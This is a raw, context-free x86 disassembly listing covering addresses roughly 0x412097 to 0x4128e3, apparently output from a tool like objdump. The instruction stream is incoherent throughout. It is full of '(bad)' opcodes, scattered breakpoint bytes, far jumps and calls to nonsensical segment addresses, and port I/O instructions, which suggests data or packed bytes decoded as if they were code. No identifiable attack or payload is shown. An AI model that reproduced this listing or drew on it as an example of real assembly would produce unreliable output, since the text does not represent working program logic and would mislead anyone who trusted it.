  412097:	into   
  412098:	add    eax,0xff00838f
  41209d:	inc    DWORD PTR [eax]
  41209f:	mov    eax,0xd9ff00
  4120a4:	addr16 pusha 
  4120a6:	mov    ebp,0xccc5dc3b
  4120ab:	add    BYTE PTR [ebx-0x50100],al
  4120b1:	add    BYTE PTR [ebx],bh
  4120b3:	call   esp
  4120b5:	cmc    
  4120b6:	imul   esi,DWORD PTR [ecx-0x7cd049],0x58ffffff
  4120c0:	add    bh,bh
  4120c2:	xor    edi,edi
  4120c4:	scas   eax,DWORD PTR es:[edi]
  4120c5:	ds pop esp
  4120c7:	adc    al,0xe
  4120c9:	test   DWORD PTR [eax],0x89008900
  4120cf:	fcos   
  4120d1:	sbb    DWORD PTR [edi],0xffffffff
  4120d4:	data16 shl cl,1
  4120d7:	ret    
  4120d8:	scas   al,BYTE PTR es:[edi]
  4120d9:	fcos   
  4120db:	add    ah,cl
  4120dd:	add    bh,bh
  4120df:	and    eax,0x8316ffff
  4120e4:	(bad)  
  4120e5:	fs imul esi,esi,0xff45a5
  4120ec:	dec    DWORD PTR [ecx-0xffd401]
  4120f2:	pop    ebp
  4120f3:	dec    DWORD PTR [edx-0x62]
  4120f6:	es out 0x9b,al
  4120f9:	dec    eax
  4120fa:	cmp    edi,0xffffffff
  4120fd:	cmp    edi,0xffffffaf
  412100:	(bad)  
  412101:	inc    DWORD PTR [edi]
  412103:	call   DWORD PTR [ebx+0x3815dae4]
  412109:	pop    eax
  41210a:	inc    DWORD PTR [eax]
  41210c:	inc    DWORD PTR [eax]
  41210e:	call   FWORD PTR [eax+0x0]
  412111:	sbb    DWORD PTR [edi+0x238842ff],0xc
  412118:	mov    DWORD PTR ds:0xffccffff,esp
  41211e:	push   eax
  412120:	inc    DWORD PTR [eax]
  412122:	das    
  412123:	call   DWORD PTR [ebp-0xcb272bd]
  412129:	sar    edi,1
  41212b:	add    bh,bh
  41212d:	add    DWORD PTR [ebx-0x3476ff97],0xffffffff
  412134:	fild   QWORD PTR [esi]
  412136:	pushf  
  412137:	lock jno 0x412167
  41213a:	add    bh,bh
  41213c:	add    bh,bh
  41213e:	add    BYTE PTR [eax],bl
  412140:	(bad)  
  412141:	call   DWORD PTR [edi+0x5c4f7983]
  412147:	test   BYTE PTR [eax-0x7cff8c],cl
  41214d:	add    DWORD PTR [eax],0x48
  412150:	inc    DWORD PTR [eax]
  412152:	out    0x83,al
  412154:	mov    cl,0xfa
  412156:	imul   dh
  412158:	js     0x4121c9
  41215a:	add    bh,bh
  41215c:	cmp    edi,0xffffff83
  41215f:	(bad)  
  412161:	add    DWORD PTR [ebx+eax*4],0x67
  412165:	jmp    0x412111
  412167:	lea    ebx,[edi+0x2e]
  41216a:	inc    DWORD PTR [eax]
  41216c:	or     esp,0x0
  41216f:	jne    0x4120f4
  412171:	int3   
  412172:	mov    al,ds:0xe59472ff
  412177:	pusha  
  412178:	sub    al,0x63
  41217a:	(bad)  
  41217b:	dec    esp
  41217d:	(bad)  
  41217e:	jmp    ecx
  412180:	cmp    edi,0x19
  412183:	adc    DWORD PTR [edi],0x42
  412186:	fld    QWORD PTR [esi*8-0xff00e6]
  41218d:	add    bh,bh
  41218f:	xchg   edx,eax
  412190:	add    bh,bh
  412192:	add    DWORD PTR [eax],0xdc4cab4a
  412198:	push   edx
  41219a:	cmp    edi,0xffffff83
  41219d:	mov    edi,edi
  41219f:	mov    dh,0xff
  4121a1:	add    BYTE PTR [ebx+eax*4+0xc],bh
  4121a5:	(bad)  
  4121a6:	push   0x62
  4121a8:	hlt    
  4121a9:	mov    edi,0xff8300
  4121ae:	add    BYTE PTR [esi+0xc60089],ah
  4121b4:	inc    eax
  4121b5:	push   0xdc12987c
  4121ba:	mov    DWORD PTR [ebx-0x2600ff01],eax
  4121c0:	dec    esp
  4121c2:	clc    
  4121c3:	add    BYTE PTR [ebp+eax*8-0x57287021],dl
  4121ca:	add    bh,bh
  4121cc:	inc    DWORD PTR [eax]
  4121ce:	inc    DWORD PTR [esi-0x7cee0000]
  4121d4:	not    BYTE PTR ds:0x518f4ab3
  4121da:	add    DWORD PTR [eax],0xffffff83
  4121dd:	(bad)  
  4121de:	jmp    DWORD PTR [ecx-0x7c6c0001]
  4121e4:	adc    DWORD PTR [ecx-0x24336a77],esi
  4121ea:	(bad)  
  4121eb:	(bad)  
  4121ec:	inc    DWORD PTR [eax]
  4121ee:	push   DWORD PTR [eax]
  4121f0:	add    DWORD PTR [eax],0x8
  4121f3:	add    BYTE PTR ds:0x92073a8c,cl
  4121f9:	dec    esi
  4121fa:	inc    DWORD PTR [eax]
  4121fc:	(bad)  
  4121fd:	dec    esp
  4121ff:	idiv   bh
  412201:	add    BYTE PTR [esi-0x1],dh
  412204:	stos   DWORD PTR es:[edi],eax
  412205:	jae    0x41222e
  412207:	pop    edi
  412208:	jecxz  0x41227c
  41220a:	int3   
  41220b:	inc    DWORD PTR [ebx-0x670001]
  412211:	add    dh,bl
  412213:	add    BYTE PTR [ebx],al
  412215:	push   edx
  412216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412217:	jbe    0x412264
  412219:	mov    al,ds:0xff830000
  41221e:	jmp    DWORD PTR [ebx]
  412220:	int3   
  412221:	xor    edx,0xffffffcc
  412224:	fistp  DWORD PTR [eax+0xc]
  412227:	pop    ss
  412228:	jmp    0xffff:0xff0083f7
  41222f:	dec    eax
  412230:	mov    edi,edi
  412232:	or     DWORD PTR [eax],eax
  412234:	imul   esi,DWORD PTR [ebp+0x2d],0xffffff86
  412238:	xor    bl,BYTE PTR [ebx+eax*4]
  41223b:	(bad)  
  41223c:	inc    DWORD PTR [eax]
  41223e:	mov    DWORD PTR [esi],esp
  412240:	add    DWORD PTR [eax],0x3
  412243:	int3   
  412244:	cmp    eax,0x3892e38f
  412249:	stc    
  41224a:	inc    DWORD PTR [eax]
  41224c:	add    BYTE PTR [eax],al
  41224e:	int3   
  41224f:	js     0x412250
  412251:	inc    edx
  412253:	mov    DWORD PTR [esi+0x2876f019],eax
  412259:	rol    DWORD PTR [ebx-0x1],1
  41225f:	push   edi
  412260:	(bad)  
  412261:	call   FWORD PTR [ecx-0x1]
  412264:	and    edi,DWORD PTR [ebp-0x2f]
  412267:	pop    ebp
  412268:	mov    bl,0x74
  41226a:	add    BYTE PTR [eax],al
  41226c:	(bad)  
  41226d:	(bad)  
  41226e:	call   ecx
  412270:	int3   
  412271:	inc    DWORD PTR [esi+0x0]
  412274:	call   0xcc1a:0xce2bbcf1
  41227b:	inc    DWORD PTR [eax]
  41227d:	add    BYTE PTR [eax],al
  41227f:	daa    
  412280:	add    bh,bh
  412282:	cdq    
  412283:	add    BYTE PTR [edi+eax*1],dl
  412286:	es jb  0x4122f4
  412289:	test   edi,edi
  41228b:	inc    DWORD PTR [eax]
  41228d:	dec    esp
  41228f:	push   esp
  412290:	add    bh,bh
  412292:	jmp    0xe240:0x3dbbe9ff
  412299:	ds (bad) 
  41229b:	(bad)  
  41229c:	(bad)  
  41229d:	inc    DWORD PTR [ebx-0x597cffa3]
  4122a3:	push   DWORD PTR ds:0xf1664f71
  4122a9:	aam    0x0
  4122ab:	add    bh,bh
  4122ad:	int3   
  4122ae:	jmp    FWORD PTR [edx-0x34]
  4122b1:	inc    DWORD PTR [ecx]
  4122b3:	sub    ebx,0x72
  4122b6:	mov    edi,0xff905371
  4122bb:	add    bh,bh
  4122bd:	add    BYTE PTR [ecx+0x21ff005e],cl
  4122c3:	add    bl,ch
  4122c5:	popf   
  4122c6:	or     al,0x3e
  4122c8:	std    
  4122c9:	pushf  
  4122ca:	inc    DWORD PTR [eax]
  4122cc:	add    DWORD PTR [eax],0xffffff89
  4122cf:	mov    al,ds:0xff8f0000
  4122d4:	xchg   esi,eax
  4122d5:	pop    ebx
  4122d6:	jge    0x412345
  4122d8:	mov    ?,WORD PTR [esi]
  4122da:	int3   
  4122db:	int3   
  4122dc:	inc    DWORD PTR [eax]
  4122de:	call   DWORD PTR [ebx]
  4122e0:	cmp    edi,0xffffffbe
  4122e3:	push   DWORD PTR [esi+0x29]
  4122e6:	stos   BYTE PTR es:[edi],al
  4122e7:	add    cl,BYTE PTR ds:[edx-0x1]
  4122eb:	inc    DWORD PTR [ebx-0x890000]
  4122f1:	int3   
  4122f2:	push   es
  4122f3:	jmp    DWORD PTR [eax]
  4122f5:	in     al,0x93
  4122f7:	jae    0x412319
  4122f9:	pop    esi
  4122fa:	int3   
  4122fb:	mov    DWORD PTR [eax],eax
  4122fd:	add    BYTE PTR [ecx-0x610000cb],cl
  412303:	add    BYTE PTR ds:0xd26c55ed,dl
  412309:	and    eax,DWORD PTR [eax]
  41230b:	add    ah,cl
  41230d:	inc    DWORD PTR [ebx-0x19000028]
  412313:	inc    DWORD PTR [eax+0xb]
  412316:	jns    0x4122cb
  412318:	mov    DWORD PTR [ebx-0x7d],esi
  41231b:	add    BYTE PTR [eax],al
  41231d:	add    BYTE PTR [eax],al
  41231f:	(bad)  
  412320:	(bad)  
  412321:	inc    DWORD PTR [ecx+0x0]
  412324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412325:	jb     0x4122db
  412327:	out    dx,eax
  412328:	sub    eax,0xccccff3b
  41232d:	add    bh,bh
  41232f:	arpl   di,di
  412331:	add    BYTE PTR [esi+0x6495c1ff],bl
  412337:	xchg   ebx,eax
  412338:	mov    ch,0xb2
  41233a:	add    BYTE PTR [eax],al
  41233c:	add    BYTE PTR [ecx-0x357d],cl
  412342:	test   al,0xff
  412344:	cmp    al,0xea
  412346:	shl    BYTE PTR [eax-0x4e],cl
  412349:	out    dx,al
  41234a:	int3   
  41234b:	(bad)  
  41234c:	dec    DWORD PTR [ecx+0xffa200]
  412352:	js     0x412353
  412354:	sub    al,0xd2
  412356:	jb     0x412317
  412358:	scas   al,BYTE PTR es:[di]
  41235a:	(bad)  
  41235b:	dec    DWORD PTR [ecx-0xe3ff01]
  412361:	(bad)  
  412362:	mov    edx,0xe1f91aff
  412367:	in     eax,0xa0
  412369:	stc    
  41236a:	(bad)  
  41236b:	inc    DWORD PTR [eax]
  41236d:	dec    DWORD PTR [ecx+0x46ff8902]
  412373:	add    BYTE PTR [ebp+0x7b],ah
  412376:	xor    eax,0x3b78d0
  41237b:	add    DWORD PTR [eax],0xffffff83
  41237e:	jmp    FWORD PTR [edi-0x1]
  412381:	add    BYTE PTR [edi+edi*8+0x5364320],ah
  412388:	in     al,0x17
  41238a:	inc    DWORD PTR [eax]
  41238c:	(bad)  
  41238d:	(bad)  
  41238e:	call   DWORD PTR [ecx-0x1]
  412391:	push   ecx
  412393:	jmp    FWORD PTR [ebp-0x7bae393c]
  412399:	and    edi,edi
  41239b:	add    BYTE PTR [ecx-0xb3007d],cl
  4123a1:	add    BYTE PTR [eax],dl
  4123a3:	call   DWORD PTR ds:0xd5434c72
  4123a9:	icebp  
  4123aa:	(bad)  
  4123ab:	(bad)  
  4123ac:	inc    DWORD PTR [eax]
  4123ae:	int3   
  4123af:	xchg   ecx,eax
  4123b0:	(bad)  
  4123b1:	inc    esp
  4123b3:	mov    DWORD PTR ds:0xd4ad802d,esp
  4123b9:	pop    esi
  4123ba:	add    bh,bh
  4123bc:	dec    esp
  4123be:	int3   
  4123bf:	jmp    0xc3af:0xff5583ff
  4123c6:	cdq    
  4123c7:	mov    eax,0x838f55
  4123cc:	mov    esp,ecx
  4123ce:	xor    DWORD PTR [edi],0xffffffff
  4123d1:	add    DWORD PTR [edi+edi*8-0x6925bc],0xffffff9f
  4123d9:	mov    edi,?
  4123db:	inc    DWORD PTR [eax]
  4123dd:	or     DWORD PTR [ecx+0x39ffffcf],0xffffff83
  4123e4:	stc    
  4123e5:	xor    al,0x4d
  4123e7:	aas    
  4123e8:	in     eax,dx
  4123e9:	retf   
  4123ea:	add    BYTE PTR [eax],al
  4123ec:	inc    DWORD PTR [eax]
  4123ee:	int3   
  4123ef:	mov    ebp,0xfffc8900
  4123f4:	out    0x1a,eax
  4123f6:	dec    esi
  4123f7:	jmp    FWORD PTR [esi+0xff0027]
  4123fd:	(bad)  
  4123fe:	call   FWORD PTR [eax+eax*1-0x1]
  412402:	repnz push DWORD PTR [ebx]
  412405:	inc    ebp
  412406:	loop   0x4123a5
  412408:	sti    
  412409:	das    
  41240a:	int3   
  41240b:	inc    DWORD PTR [ebx-0x3366ff01]
  412411:	xor    DWORD PTR [edi+edi*8],0x25
  412415:	outs   dx,BYTE PTR ds:[esi]
  412416:	outs   dx,BYTE PTR ds:[esi]
  412417:	mov    bl,0xbe
  412419:	inc    ebx
  41241a:	cmp    edi,0xffffffff
  41241d:	add    ah,cl
  41241f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412420:	dec    DWORD PTR [ecx+0x31d6ff1f]
  412426:	xlat   BYTE PTR ds:[ebx]
  412427:	(bad)  
  412428:	fild   QWORD PTR ds:0xffffffff
  41242e:	jmp    ebx
  412430:	(bad)  
  412431:	inc    DWORD PTR [edi+edi*8]
  412434:	push   esi
  412435:	pop    edi
  412436:	push   esp
  412437:	push   0x2b
  412439:	mov    esi,0x83830000
  41243e:	jmp    DWORD PTR [edi+0xf5ffff]
  412444:	retf   
  412445:	fsubr  QWORD PTR [ebp-0x33eb4518]
  41244b:	or     esp,0xffffffff
  41244e:	or     DWORD PTR [ebp-0xe8007d],0xfffffff9
  412455:	neg    DWORD PTR [ebx-0x2d4d0e]
  41245b:	(bad)  
  41245c:	(bad)  
  41245d:	inc    DWORD PTR [eax]
  41245f:	idiv   bh
  412461:	add    BYTE PTR [edx-0x34],al
  412464:	sub    eax,0xf53cb7fb
  412469:	pop    esp
  41246a:	inc    DWORD PTR [eax]
  41246c:	add    bh,bh
  41246e:	xor    DWORD PTR [eax-0xf90001],0x31
  412475:	inc    ebx
  412476:	in     al,dx
  412477:	mov    esi,0xcc0062df
  41247c:	inc    DWORD PTR [eax]
  41247e:	inc    ebp
  412480:	int3   
  412481:	mov    DWORD PTR [eax-0x551ba600],edx
  412487:	imul   eax,edx,0x838300c9
  41248d:	or     DWORD PTR [ecx-0x43ff7c9e],0xffffff83
  412494:	sahf   
  412495:	mov    ch,0x1d
  412497:	emms   
  412499:	sti    
  41249a:	add    BYTE PTR [ebx+0x5e898989],al
  4124a0:	add    DWORD PTR [eax],0x60
  4124a3:	jmp    FWORD PTR [ecx-0xe0f606a]
  4124a9:	out    dx,eax
  4124aa:	mov    DWORD PTR [eax],eax
  4124ac:	inc    DWORD PTR [eax]
  4124ae:	add    BYTE PTR [ebp+0x1fff00],ah
  4124b4:	shl    esi,1
  4124b6:	pop    ebp
  4124b7:	jmp    0x41ff13
  4124bc:	mov    edi,edi
  4124be:	inc    DWORD PTR [eax+eax*1-0x6f009201]
  4124c5:	mov    al,ds:0xd3f35096
  4124ca:	add    bh,bh
  4124cc:	add    ah,cl
  4124ce:	int3   
  4124cf:	xchg   ecx,eax
  4124d0:	(bad)  
  4124d1:	dec    DWORD PTR [edi]
  4124d3:	add    bl,cl
  4124d5:	mov    eax,0x79cef6fb
  4124da:	add    BYTE PTR [ebx-0x3ff0100],al
  4124e0:	add    bh,bh
  4124e2:	nop
  4124e3:	int3   
  4124e4:	jnp    0x4124bc
  4124e6:	push   edx
  4124e7:	pop    edi
  4124e8:	dec    ebx
  4124e9:	mov    dl,0xff
  4124eb:	or     DWORD PTR [ecx+0xa30083],0xffffffff
  4124f2:	cli    
  4124f3:	(bad)  
  4124f4:	mov    edx,0x480e5cbe
  4124f9:	jg     0x4124c7
  4124fb:	add    DWORD PTR [eax],0xffffffff
  4124fe:	push   DWORD PTR [ecx-0x1]
  412501:	add    BYTE PTR ds:0xf9613e00,bl
  412507:	pusha  
  412508:	cwde   
  412509:	inc    DWORD PTR [bx+si]
  41250c:	inc    DWORD PTR [eax]
  41250e:	dec    DWORD PTR [ebx-0x127c01]
  412514:	mov    cl,0x3b
  412516:	fs test al,0xf9
  412519:	arpl   WORD PTR [ebx-0x7c7c3301],ax
  41251f:	mov    ch,0xcc
  412521:	add    BYTE PTR [edi],ch
  412523:	int3   
  412524:	cmp    al,0xe4
  412526:	popa   
  412527:	push   esp
  412528:	mov    WORD PTR ds:0xff0000ff,gs
  41252e:	add    cl,dh
  412530:	add    DWORD PTR [eax],0x47
  412533:	call   DWORD PTR [edx+0x6]
  412536:	sbb    edi,ecx
  412538:	bound  ecx,QWORD PTR [esi]
  41253a:	inc    DWORD PTR [eax]
  41253c:	inc    DWORD PTR [eax]
  41253e:	inc    DWORD PTR [esi-0x34]
  412541:	add    BYTE PTR [eax],bh
  412543:	inc    edx
  412545:	fsub   DWORD PTR [ebp-0x86ec03]
  41254b:	add    bh,bh
  41254d:	int3   
  41254e:	int3   
  41254f:	jo     0x412550
  412551:	add    BYTE PTR [edx],ch
  412553:	call   DWORD PTR [eax-0x3a17b308]
  412559:	into   
  41255a:	add    BYTE PTR [eax],al
  41255c:	mov    edi,edi
  41255e:	adc    DWORD PTR [eax-0x34],0xffffff89
  412562:	add    DWORD PTR [eax],eax
  412564:	xor    DWORD PTR [ebx],ebx
  412566:	(bad)  [ebp-0xffd484]
  41256c:	(bad)  
  41256d:	dec    DWORD PTR [ecx-0x31000068]
  412573:	inc    edi
  412575:	xchg   ecx,eax
  412576:	xchg   edi,eax
  412577:	nop
  412578:	and    eax,0x83008992
  41257d:	(bad)  
  41257e:	call   DWORD PTR [ecx]
  412580:	add    DWORD PTR [eax],0xffffffa1
  412583:	(bad)  
  412584:	cld    
  412585:	pop    eax
  412586:	pushf  
  412587:	and    edx,DWORD PTR [ecx+0xff64]
  41258d:	(bad)  
  41258e:	(bad)  
  41258f:	fcmove st,st(4)
  412591:	add    BYTE PTR [eax-0x1],bh
  412594:	sbb    BYTE PTR [esi+0x25],0x8d
  412598:	pop    eax
  412599:	xor    bh,bh
  41259b:	add    DWORD PTR [eax],0xffffffcc
  41259e:	sbb    ecx,0xffffff83
  4125a1:	jmp    DWORD PTR [eax-0xa0b9e00]
  4125a7:	sti    
  4125a8:	inc    edx
  4125a9:	and    al,0xff
  4125ab:	add    BYTE PTR [ebx-0x33b80077],al
  4125b1:	adc    ebx,0xffffff89
  4125b4:	and    esi,0x9b7f4b8b
  4125ba:	(bad)  
  4125bb:	inc    DWORD PTR [ebx-0x761b0100]
  4125c1:	call   FWORD PTR [ecx]
  4125c3:	cmp    DWORD PTR [ebp+0x79f3dbf3],0xffffffc8
  4125ca:	add    bh,bh
  4125cc:	inc    DWORD PTR [eax]
  4125ce:	or     DWORD PTR [edx-0x1],0xffffff89
  4125d2:	fiadd  DWORD PTR [eax]
  4125d4:	sbb    al,0x46
  4125d6:	sbb    DWORD PTR [ebx-0x17],eax
  4125d9:	stos   DWORD PTR es:[edi],eax
  4125da:	int3   
  4125db:	inc    DWORD PTR [eax]
  4125dd:	add    bh,bh
  4125df:	out    0x89,al
  4125e1:	(bad)  
  4125e2:	js     0x4125e3
  4125e4:	mov    WORD PTR [edi+0x33],?
  4125e7:	inc    edi
  4125e8:	pusha  
  4125e9:	jge    0x4125eb
  4125eb:	add    bh,bh
  4125ed:	add    bh,bh
  4125ef:	test   bh,bh
  4125f1:	jmp    FWORD PTR [edi]
  4125f3:	add    BYTE PTR [edx],bl
  4125f5:	sub    BYTE PTR [esi-0x7cc6ca9f],ah
  4125fb:	add    bh,bh
  4125fd:	add    bh,bh
  4125ff:	xchg   ebp,eax
  412600:	inc    DWORD PTR [eax]
  412602:	mov    DWORD PTR [eax],eax
  412604:	ret    0x492
  412607:	dec    esp
  412608:	push   ss
  412609:	ror    ah,cl
  41260b:	mov    DWORD PTR [ebx-0x627677],eax
  412611:	mov    DWORD PTR [edi-0x7d],eax
  412614:	imul   edi,DWORD PTR [ebx-0x4faf1716],0xffffff
  41261e:	call   DWORD PTR [ebp+0x0]
  412621:	or     DWORD PTR [eax+eax*1+0x26],0xffffffa8
  412626:	pop    ebp
  412627:	inc    eax
  412628:	addr16 xchg ebp,eax
  41262a:	or     DWORD PTR [ecx+0x3d0000ff],0xffffffff
  412631:	add    BYTE PTR [ebx],dl
  412633:	sub    esi,0x1d
  412636:	ss xor eax,0xffff3b94
  41263c:	(bad)  
  41263d:	(bad)  
  41263e:	jmp    DWORD PTR [ebx-0x760d7c01]
  412644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412645:	lock (bad) 
  412647:	push   ecx
  412648:	inc    ebx
  412649:	add    BYTE PTR cs:[eax],al
  41264c:	add    DWORD PTR [eax],0xffffffff
  41264f:	int    0x0
  412651:	inc    DWORD PTR [ebx-0x16f5c601]
  412657:	mov    ecx,0xffff89b5
  41265c:	add    DWORD PTR [eax],0xffffffff
  41265f:	sub    DWORD PTR [ebx-0x21ffec7d],eax
  412665:	aas    
  412666:	push   es
  412667:	bound  esi,QWORD PTR [eax+0xccffbc]
  41266d:	inc    DWORD PTR [ebx+0x12ffcc8b]
  412673:	call   DWORD PTR [eax-0x64]
  412676:	push   edx
  412677:	jo     0x4126d4
  412679:	(bad)  
  41267a:	(bad)  
  41267b:	(bad)  
  41267c:	(bad)  
  41267d:	dec    DWORD PTR [ecx-0x5ff00c2]
  412683:	call   DWORD PTR [ebp-0x65]
  412686:	fcom   st(3)
  412688:	jo     0x41263f
  41268a:	add    BYTE PTR [eax],al
  41268c:	cmp    edi,0xffffffff
  41268f:	cwde   
  412690:	(bad)  
  412691:	(bad)  
  412692:	mov    ebx,0x246ff000
  412697:	adc    DWORD PTR ds:0xcc0089e8,ecx
  41269d:	mov    edi,edi
  41269f:	mov    al,ds:0x5b8300
  4126a4:	ror    DWORD PTR [ebp+0x6c556c10],1
  4126aa:	int3   
  4126ab:	mov    DWORD PTR [ebx-0x767b0001],eax
  4126b1:	dec    DWORD PTR ds:0x8deed5ff
  4126b7:	fisub  DWORD PTR ds:0xff89003e
  4126bd:	add    BYTE PTR [eax],al
  4126bf:	inc    ebp
  4126c0:	add    BYTE PTR [ebx-0x5df80061],al
  4126c6:	push   eax
  4126c7:	xchg   ecx,eax
  4126c8:	or     bh,BYTE PTR [ebx+eax*4+0xff00ff]
  4126cf:	ins    BYTE PTR es:[edi],dx
  4126d0:	mov    DWORD PTR [ebx+0x67a8cc09],eax
  4126d6:	das    
  4126d7:	(bad)  
  4126d8:	push   ebx
  4126d9:	mov    ecx,DWORD PTR [ecx-0xff0100]
  4126df:	push   ss
  4126e0:	(bad)  
  4126e1:	dec    ecx
  4126e3:	add    bl,dh
  4126e5:	mov    dl,0xab
  4126e7:	or     al,0x37
  4126e9:	inc    ecx
  4126ea:	dec    esp
  4126ec:	mov    edi,edi
  4126ee:	add    bl,dh
  4126f0:	add    bh,bh
  4126f2:	mov    eax,0x42965e89
  4126f7:	xchg   ebp,eax
  4126f8:	test   al,0xdf
  4126fa:	inc    DWORD PTR [eax]
  4126fc:	(bad)  
  4126fd:	(bad)  
  4126fe:	jmp    DWORD PTR [ebx-0x34]
  412701:	call   FWORD PTR [ebx-0x7d]
  412704:	pop    ds
  412705:	(bad)  
  412706:	pop    edx
  412707:	push   edi
  412708:	mov    ds:0xff0092,eax
  41270d:	add    BYTE PTR [ecx-0x3a007c1c],cl
  412713:	add    dl,ah
  412715:	xchg   DWORD PTR [edi+0x22],ebp
  412718:	sub    esi,DWORD PTR [edi-0x1]
  41271b:	int3   
  41271c:	inc    DWORD PTR [ebx-0x3300fd01]
  412722:	or     al,0x0
  412724:	cdq    
  412725:	sbb    eax,0xae888236
  41272a:	mov    DWORD PTR [eax],eax
  41272c:	add    BYTE PTR [eax],al
  41272e:	int3   
  41272f:	mov    esi,0xcc6300ff
  412734:	cld    
  412735:	and    eax,0x3f8fd8d3
  41273a:	add    BYTE PTR [eax],al
  41273c:	cmp    edi,0x0
  41273f:	cld    
  412740:	inc    DWORD PTR [eax]
  412742:	out    dx,al
  412743:	inc    DWORD PTR [edx-0x15]
  412746:	ror    BYTE PTR [eax],cl
  412748:	xlat   BYTE PTR ds:[ebx]
  412749:	ins    BYTE PTR es:[edi],dx
  41274a:	add    BYTE PTR [eax],al
  41274c:	inc    DWORD PTR [ebx-0x4800]
  412752:	jmp    0x412754
  412754:	outs   dx,DWORD PTR ds:[esi]
  412755:	cmc    
  412756:	imul   ch
  412758:	inc    bl
  41275a:	mov    edi,edi
  41275c:	add    bh,bh
  41275e:	mov    DWORD PTR [edi+edi*8+0x0],edx
  412762:	push   ds
  412763:	jmp    FWORD PTR [eax-0x1d5c4a99]
  412769:	add    DWORD PTR [bx+si],0x0
  41276d:	add    bh,bh
  41276f:	out    dx,al
  412770:	mov    DWORD PTR [eax],eax
  412772:	in     al,0xff
  412774:	bound  edi,QWORD PTR [ebx+edx*8-0x5e]
  412778:	in     al,dx
  412779:	jb     0x41277b
  41277b:	add    BYTE PTR [eax],al
  41277d:	mov    edi,edi
  41277f:	js     0x412781
  412781:	xor    DWORD PTR [edx+0x215fadff],0x4a
  412788:	clc    
  412789:	lahf   
  41278a:	dec    esp
  41278c:	(bad)  
  41278d:	inc    DWORD PTR [ebx+0x500000d0]
  412793:	add    cl,cl
  412795:	dec    esp
  412796:	mov    ebp,0xffc9ca3c
  41279b:	inc    DWORD PTR [ebx-0x769f7700]
  4127a1:	call   FWORD PTR [eax-0x7d]
  4127a4:	push   ds
  4127a5:	adc    al,0x2
  4127a7:	mov    eax,ds:0x8300f912
  4127ac:	add    bh,bh
  4127ae:	add    BYTE PTR [edx],ah
  4127b0:	add    bh,bh
  4127b2:	or     BYTE PTR [eax],al
  4127b4:	add    eax,0x577ff7e9
  4127b9:	xor    DWORD PTR [eax],eax
  4127bb:	inc    DWORD PTR [ebx+0xccccff]
  4127c1:	(bad)  
  4127c2:	(bad)  
  4127c4:	(bad)  
  4127c5:	sbb    eax,0x5cc4e367
  4127ca:	dec    esp
  4127cc:	add    BYTE PTR [ecx+0x3483],cl
  4127d2:	and    cl,BYTE PTR [ecx-0x245039c0]
  4127d8:	rcl    DWORD PTR [ebx+eax*4-0x7c3301],cl
  4127df:	lea    eax,[ebx-0x18ff2001]
  4127e5:	mov    ecx,0x592215df
  4127ea:	mov    DWORD PTR [ebx+0x4cccffcc],eax
  4127f0:	add    DWORD PTR [eax],0xffffffb6
  4127f3:	(bad)  
  4127f4:	mov    edi,0x9e387e31
  4127f9:	jae    0x4127fa
  4127fb:	inc    DWORD PTR [eax]
  4127fd:	dec    esp
  4127ff:	outs   dx,BYTE PTR ds:[esi]
  412800:	add    BYTE PTR [eax],al
  412802:	adc    edi,edi
  412804:	aaa    
  412805:	mov    ah,0xd3
  412807:	jno    0x41282c
  412809:	dec    DWORD PTR cs:[ecx-0x3c00007d]
  412810:	inc    DWORD PTR [ebx-0x207d0051]
  412816:	lock sar DWORD PTR [ecx],cl
  412819:	icebp  
  41281a:	int3   
  41281b:	(bad)  
  41281c:	inc    DWORD PTR [eax]
  41281e:	add    BYTE PTR [ecx],ah
  412820:	inc    DWORD PTR [eax]
  412822:	sahf   
  412823:	mov    DWORD PTR [ebp+0x29500ccb],ebx
  412829:	push   esp
  41282a:	int3   
  41282b:	add    BYTE PTR [ebx+0xc6ccff],al
  412831:	add    BYTE PTR [ecx+0x52f2d1ff],cl
  412837:	or     BYTE PTR [eax-0x35],0xff
  41283b:	int3   
  41283c:	(bad)  
  41283d:	(bad)  
  41283e:	jmp    DWORD PTR [esi-0x9ff77]
  412844:	xor    al,0x8f
  412846:	out    dx,eax
  412847:	push   es
  412848:	fadd   QWORD PTR [ebx-0x7c01]
  41284e:	call   FWORD PTR [ebp-0x1]
  412851:	add    BYTE PTR ds:0x51fc03ff,cl
  412857:	xor    eax,0xffffc19e
  41285c:	inc    DWORD PTR [eax]
  41285e:	add    BYTE PTR [ebx-0xebff7d],ch
  412864:	push   edx
  412865:	aad    0x68
  412867:	pop    edi
  412868:	outs   dx,BYTE PTR ds:[esi]
  412869:	xor    bh,bh
  41286b:	(bad)  
  41286c:	inc    DWORD PTR [eax]
  41286e:	cmp    DWORD PTR [ebp-0xcd0001],0x4a
  412875:	mov    bl,0x92
  412877:	push   DWORD PTR [ebx+0x74]
  41287a:	(bad)  
  41287b:	inc    DWORD PTR [eax]
  41287d:	add    bh,bh
  41287f:	ds (bad) 
  412881:	inc    DWORD PTR [eax-0x7d]
  412884:	call   0xff1a:0xee8462e7
  41288b:	(bad)  
  41288c:	dec    esp
  41288e:	add    BYTE PTR [esi-0x480100],bh
  412894:	jecxz  0x4128dd
  412896:	daa    
  412897:	pop    ss
  412898:	daa    
  412899:	jl     0x412867
  41289b:	(bad)  
  41289c:	(bad)  
  41289d:	inc    DWORD PTR [eax]
  41289f:	outs   dx,DWORD PTR ds:[esi]
  4128a0:	dec    DWORD PTR [ecx+0x4a2fccec]
  4128a6:	jle    0x412843
  4128a8:	lahf   
  4128a9:	loop   0x4128aa
  4128ab:	inc    DWORD PTR [eax]
  4128ad:	mov    edi,edi
  4128af:	push   ss
  4128b0:	add    bh,bh
  4128b2:	pop    ds
  4128b3:	push   eax
  4128b5:	mov    DWORD PTR [edx],ebp
  4128b7:	retw   0xff67
  4128bb:	int3   
  4128bc:	add    BYTE PTR [eax],al
  4128be:	add    dh,bh
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	xchg   edi,eax
  4128c3:	add    bl,ch
  4128c5:	adc    esi,ecx
  4128c7:	push   es
  4128c8:	idiv   DWORD PTR [ebp-0xff0001]
  4128ce:	add    BYTE PTR [eax-0x1],ch
  4128d1:	mov    DWORD PTR [edi+edi*8+0x45],esi
  4128d5:	sbb    bl,BYTE PTR [ecx-0x7cf9be33]
  4128db:	inc    DWORD PTR [eax]
  4128dd:	inc    DWORD PTR [ebx+0x368383ed]
  4128e3:	cmp    DWORD PTR [ebx-0x3c],0x56
